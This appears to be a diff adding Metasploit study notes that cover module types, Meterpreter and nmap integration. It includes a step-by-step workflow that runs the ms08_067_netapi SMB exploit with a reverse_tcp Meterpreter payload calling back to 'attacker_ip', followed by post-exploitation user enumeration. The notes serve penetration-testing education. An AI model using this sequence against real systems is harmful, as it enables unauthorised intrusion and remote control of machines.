@@ -54,3 +54,89 @@ There are four main types of modules in Metasploit:
 	```terminal
 	use auxiliary/scanner/portscan/tcp
 	```
+3. **Payloads**
+	- Payloads are code delivered to the target machine after exploiting a vulnerability
+	- They can create a remote shell, open a backdoor, or gather information
+	- e.g. 
+	```terminal
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	```
+4. **Post-Exploitation Modules**
+	- After compromising a system, post-exploitation modules allow you to gather further information, escalate privileges, or move laterally within the network
+	- e.g. 
+	```terminal
+	use post/windows/gather/enum_logged_on_users
+	```
+
+### Key Metasploit Components
+1. **Exploit Database**
+	- Metasploit houses a massive database of publicly know exploits
+	- You can search through it for vulnerabilities in the target system
+2. **Meterpreter**
+	- Meterpreter is the default payload used in metasploit, offering a suite of post-exploitation tools to help gather information, escalate privileges, or maintain access 
+3. **Nmap Integration**
+	- nmap can be integrated with metasploit for advanced scanning and port mapping 
+```terminal
+db_nmap -sV target_ip
+```
+---
+
+# Common Workflow in Metasploit
+1. **Scanning and Discovery**
+	- use `Nmap` or `auxiliary modules` for scanning 
+```bash
+use auxiliary/scanner/portscan/tcp
+set RHOSTS target_ip
+run
+```
+2. **Searching for Exploits**
+	- Based on the results, search for relevant exploits 
+	- e.g. if a service like `SMB` is discovered
+```bash
+search smb
+```
+3. **Selecting an Exploit**
+	- Choose an exploit form the search results
+```bash
+use exploit/windows/smb/ms08_067_netapi
+```
+4. **Setting Options**
+	- Set the target IP and other necessary parameters 
+```bash
+set RHOSTS target_ip
+set LHOST attacker_ip
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+5. **Exploiting the target**
+	- Once all the options are configured, execute the exploit 
+```bash
+exploit
+```
+6. **Post-Exploitation**
+	- After successfully exploiting the target, you can use post-exploitation modules 
+	- e.g.
+```bash
+use post/windows/gather/enum_logged_on_users
+```
+---
+# Important Commands Recap
+- Search for modules
+```bash
+search <keyword>
+```
+- view information about a module
+```bash
+info <module_name>
+```
+- set exploit/payload/option
+```bash
+set <option_name> <value>
+```
+- show options of loaded module
+```bash
+show options
+```
+- execute an exploit or auxiliary module 
+```bash
+run or exploit
+```
